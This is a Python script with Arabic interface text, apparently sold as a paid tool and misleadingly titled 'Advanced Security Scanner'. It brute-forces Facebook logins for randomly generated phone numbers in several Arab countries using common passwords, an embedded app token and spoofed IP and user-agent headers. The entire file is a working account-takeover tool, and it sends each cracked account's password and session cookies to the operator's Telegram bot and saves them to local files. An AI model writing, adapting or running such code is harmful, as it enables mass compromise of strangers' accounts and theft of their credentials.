import datetime
import os
import requests
import time
import re
import random
import sys
import string
import subprocess
from concurrent.futures import ThreadPoolExecutor as ConcurrentExecutor
import user_agent
from datetime import datetime as dt

COLOR_WHITE = '\x1b[1;97m'
COLOR_BLUE = '\x1b[1;94m'
COLOR_CYAN = '\x1b[1;96m'
COLOR_RED = '\x1b[1;31m'
COLOR_YELLOW = '\x1b[1;33m'
COLOR_GREEN = '\x1b[2;32m'
COLOR_PINK = '\x1b[1;95m'
COLOR_MAGENTA = '\x1b[2;35m'
COLOR_GRAY = '\x1b[2;39m'
COLOR_ORANGE1 = '\x1b[38;5;208m'
COLOR_ORANGE2 = '\x1b[38;5;202m'
COLOR_ORANGE3 = '\x1b[38;5;203m'
COLOR_ORANGE4 = '\x1b[38;5;204m'
COLOR_ORANGE5 = '\x1b[38;5;209m'
COLOR_GREEN1 = '\x1b[38;5;76m'
COLOR_GREEN2 = '\x1b[38;5;120m'
COLOR_LIME1 = '\x1b[38;5;150m'
COLOR_LIME2 = '\x1b[38;5;190m'
ACCENT_COLOR = '\x1b[38;5;208m'

def clear_screen():
    color = random.choice([COLOR_ORANGE2, COLOR_ORANGE3, COLOR_ORANGE4, COLOR_ORANGE5, 
                          COLOR_GREEN1, COLOR_GREEN2, COLOR_LIME1, COLOR_LIME2])
    os.system('clear' if os.name == 'posix' else 'cls')

# التحقق من تاريخ الصلاحية
current_date = datetime.date.today()
expiry_date = datetime.date(2026, 8, 8)
if current_date >= expiry_date:
    exit(" ⚠️ هلا بكم ادات مدفوعة!@SF7SF0n")
else:
    print("SF مدفوعة ")

# تحميل مكتبة العرض
try:
    from cfonts import render, say
except:
    os.system('pip install python-cfonts > /dev/null 2>&1')

# عرض العنوان
title_display = render('SF مدفوع', colors=['cyan', 'blue'], align='center')
print(title_display)

# تهيئة القوائم
verified_accounts = []
checkpoint_accounts = []

# إعدادات البوت
print('\n')
bot_user_id = input('Id : ')
print('\n')
bot_api_key = input('Token : ')
clear_screen()

# الشعار الجديد
logo_art = '''
╔══════════════════════════════════╗
║      @SF7SF0 v2.0       ║
║    Advanced Security Scanner     ║
╚══════════════════════════════════╝
'''

execution_count = 0
success_results = []
checkpoint_results = []


class ApplicationDetector:
    def generate_random_ip(self):
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

    def create_headers(self, ip_address):
        return {
            'authority': 'www.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '2',
            'referer': 'https://www.facebook.com/',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Secure-System";v="12", "Chromium";v="122"',
            'sec-ch-ua-full-version-list': '"Secure-System";v="12.0.0.0", "Chromium";v="122.0.6261.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Linux"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent.generate_user_agent(),
            'viewport-width': '980',
            "Forwarded": f"for={ip_address}; by={ip_address}",
            "X-Forwarded-For": ip_address,
            "X-Real-IP": ip_address,
            "Client-IP": ip_address,
        }

    def scan_applications(self, session_cookies, proxy_config=None):
        detected_apps = []
        scan_api_url = "https://www.facebook.com/settings/"
        try:
            response_data = requests.get(
                scan_api_url,
                params={'tab': 'applications'},
                cookies=session_cookies,
                headers=self.create_headers(self.generate_random_ip()),
                proxies=proxy_config,
                timeout=20
            )
            detected_apps = re.findall(r'"app_name":"(.*?)"', response_data.text)
        except:
            detected_apps = []
        return detected_apps

detector = ApplicationDetector()


def display_menu():
    clear_screen()
    print(logo_art)
    print('[1]  🔍 صيد عشوائي')
    print('[2]  ℹ️ معلومات النظام')
    print(f"{COLOR_MAGENTA} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{COLOR_ORANGE4}")
    choice = input(' اختر الخيار: ')
    if choice == '1':
        start_random_scan()
    elif choice == '2':
        show_system_info()
    else:
        print('\033[1;95m [!] خيار غير صحيح\033[0;95m')
        time.sleep(1)
        display_menu()

def show_system_info():
    clear_screen()
    print(logo_art)
    print(f"{COLOR_GREEN}╔══════════════════════════════════╗")
    print(f"║         معلومات النظام          ║")
    print(f"╠══════════════════════════════════╣")
    print(f"║ • المطور: @SF7SF0    ║")
    print(f"║ • الإصدار: 2.0                  ║")
    print(f"║ • التاريخ: {datetime.date.today().strftime('%Y-%m-%d')}        ║")
    print(f"║ • حالة الترخيص: نشط             ║")
    print(f"╚══════════════════════════════════╝{COLOR_WHITE}")
    input('\n اضغط Enter للعودة...')
    display_menu()

def start_random_scan():
    user_list = []
    clear_screen()
    print(logo_art)
    print(f'\33[38;5;160m \033[1;93m[🇮🇶 رمز العراق] \33[38;5;160m \033[1;92m0750/0770/0780\33[38;5;160m')
    print(f'{COLOR_GREEN}════════════════════════════════════════════════{COLOR_WHITE}')
    print(f'\33[38;5;160m \033[1;93m[🇸🇾 رمز سوريا] \33[38;5;160m \033[1;92m099/095/096/094\33[38;5;160m')
    print(f'{COLOR_GREEN}════════════════════════════════════════════════{COLOR_WHITE}')
    print(f'\33[38;5;160m \033[1;93m[🇱🇾 رمز ليبيا] \33[38;5;160m \033[1;92m091/092/093/094\33[38;5;160m')
    print(f'{COLOR_GREEN}════════════════════════════════════════════════{COLOR_WHITE}')
    print(f'\33[38;5;160m \033[1;93m[🇯🇴 رمز الأردن] \33[38;5;160m \033[1;92m079/078/077\33[38;5;160m')
    print(f'{COLOR_GREEN}════════════════════════════════════════════════{COLOR_WHITE}')
    print(f'\33[38;5;160m \033[1;93m[🇸🇦 رمز السعودية] \33[38;5;160m \033[1;92m050/053/054/055\33[38;5;160m')
    print(f"{COLOR_MAGENTA} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{COLOR_ORANGE4}")
    
    country_code = input('[?] اختر رمز الدولة: ')
    print(f'{COLOR_GREEN}════════════════════════════════════════════════{COLOR_WHITE}')
    
    scan_limit = 50000
    for number in range(scan_limit):
        random_number = ''.join(random.choice(string.digits) for _ in range(7))
        user_list.append(random_number)
    
    clear_screen()
    print(title_display)
    print(f'[+] العدد الإجمالي: {len(user_list)}')
    print('@SF7SF0')
    print(f'{COLOR_GREEN}════════════════════════════════════════════════{COLOR_WHITE}')
    
    with ConcurrentExecutor(max_workers=25) as executor:
        for user_number in user_list:
            user_id = country_code + user_number
            password_list = [user_id, user_number, '123456', '12345678', '11223344', 
                           'password123', 'admin1234', 'secure2024', 'system2024',
                           '00000000', '11111111', '22222222', country_code*2]
            executor.submit(scan_account, user_id, password_list)

    print(f'{COLOR_GREEN}════════════════════════════════════════════════{COLOR_WHITE}')
    print(f'[✓] اكتمل المسح في {dt.now().strftime("%H:%M:%S")}')
    print(f'[?] الحسابات الناجحة: {len(success_results)}')
    print(f'[?] الحسابات المحمية: {len(checkpoint_results)}')
    print('[?] تم الحفظ في: /sdcard/SECURE-OK.txt & /sdcard/SECURE-CP.txt')
    input('اضغط Enter للعودة للقائمة الرئيسية')
    display_menu()


def scan_account(user_id, password_list):
    global success_results, checkpoint_results, execution_count
    try:
        sys.stdout.write(f'\r[جاري بحث] {execution_count} | شغال: {len(success_results)} | سكيور: {len(checkpoint_results)}')
        sys.stdout.flush()
        
        for password in password_list:
            # إنشاء User-Agent عشوائي
            fb_version = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fb_build = str(random.randint(111111111,999999999))
            android_ver = subprocess.getoutput('getprop ro.build.version.release')
            device_model = subprocess.getoutput('getprop ro.product.model')
            build_id = subprocess.getoutput('getprop ro.build.id')
            manufacturer = subprocess.getoutput('getprop ro.product.manufacturer')
            brand = subprocess.getoutput('getprop ro.product.brand')
            display_density = f"{random.randint(1,9)}.{random.randint(1,9)}"
            screen_width = str(random.randint(500,999))
            screen_height = str(random.randint(999,1999))
            
            user_agent_string = (
                f'Dalvik/2.1.0 (Linux; U; Android {android_ver}; {device_model} Build/{build_id});'
                f'FBAN/Secure-System;FBAV/{fb_version};FBBV/{fb_build};FBRV/0;FBPN/com.facebook.katana;FBLC/en_US;'
                f'FBMF/{manufacturer};FBBD/{brand};FBDV/{device_model};FBSV/{android_ver};'
                f'FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM={{density={display_density},width={screen_width};height={screen_height}}};FB_FW/1]'
            )
            
            login_data = {
                "locale": "en_GB",
                "format": "json",
                "email": user_id,
                "password": password,
                "access_token": "438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28",
                "generate_session_cookies": 1
            }
            
            request_headers = {
                'user-agent': user_agent_string,
                'Host': 'graph.facebook.com',
                'Content-Type': 'application/json;charset=utf-8',
                'Connection': 'Keep-Alive',
                'Accept-Encoding': 'gzip'
            }
            
            response = requests.post("https://b-graph.facebook.com/auth/login", 
                                     data=login_data, headers=request_headers).json()
            
            # التحقق من النجاح
            if 'session_key' in response:
                account_id = response['uid']
                cookies_string = ';'.join(item['name'] + '=' + item['value'] for item in response['session_cookies'])
                cookies_dict = {item['name']: item['value'] for item in response['session_cookies']}
                linked_apps = detector.scan_applications(cookies_dict)
                apps_info = ", ".join(linked_apps) if linked_apps else "لا توجد تطبيقات مرتبطة"
                
                print(f'\n\033[1;32m[✅ SECURE_OK] {account_id} | {password}')
                print(f'[🍪 COOKIES] {cookies_string}')
                
                telegram_message = f'''[•Secure System Result]
👤 الحساب: {account_id}
🔑 كلمة المرور: {password}
🍪 الكوكيز: {cookies_string}
📱 التطبيقات: {apps_info}
🕒 الوقت: {dt.now().strftime("%H:%M:%S")}'''
                
                requests.get(f"https://api.telegram.org/bot{bot_api_key}/sendMessage?chat_id={bot_user_id}&text={telegram_message}")
                
                print(f'[📱 التطبيقات المرتبطة] {apps_info}')
                print(f'{COLOR_GREEN}════════════════════════════════════════════════{COLOR_WHITE}')
                
                with open('/sdcard/SECURE-OK.txt','a') as file:
                    file.write(f'{account_id}|{password}|{cookies_string}|{apps_info}\n')
                success_results.append(account_id)
                break
            
            # التحقق من Checkpoint
            elif 'www.facebook.com' in response.get('error', {}).get('message', ''):
                account_id = response['error']['error_data']['uid']
                print(f'\033[1;33m[🛡️ SECURE_CP] {account_id} | {password}')
                
                telegram_message = f'''[•Secure System - Checkpoint]
👤 الحساب: {account_id}
🔑 كلمة المرور: {password}
⚠️ الحالة: محمي بـ Checkpoint
🕒 الوقت: {dt.now().strftime("%H:%M:%S")}'''
                
                requests.get(f"https://api.telegram.org/bot{bot_api_key}/sendMessage?chat_id={bot_user_id}&text={telegram_message}")
                
                try:
                    cookies_dict = {item['name']: item['value'] for item in response.get('session_cookies', [])}
                    linked_apps = detector.scan_applications(cookies_dict)
                    apps_info = ", ".join(linked_apps) if linked_apps else "لا توجد تطبيقات مرتبطة"
                    print(f'[📱 التطبيقات المرتبطة] {apps_info}')
                except:
                    apps_info = "لا توجد تطبيقات مرتبطة"
                
                with open('/sdcard/SECURE-CP.txt','a') as file:
                    file.write(f'{account_id}|{password}|{apps_info}\n')
                checkpoint_results.append(account_id)
                print(f'{COLOR_GREEN}════════════════════════════════════════════════{COLOR_WHITE}')
                break
        execution_count += 1
    except requests.exceptions.ConnectionError:
        time.sleep(3)
    except Exception as e:
        pass


if __name__ == '__main__':
    display_menu()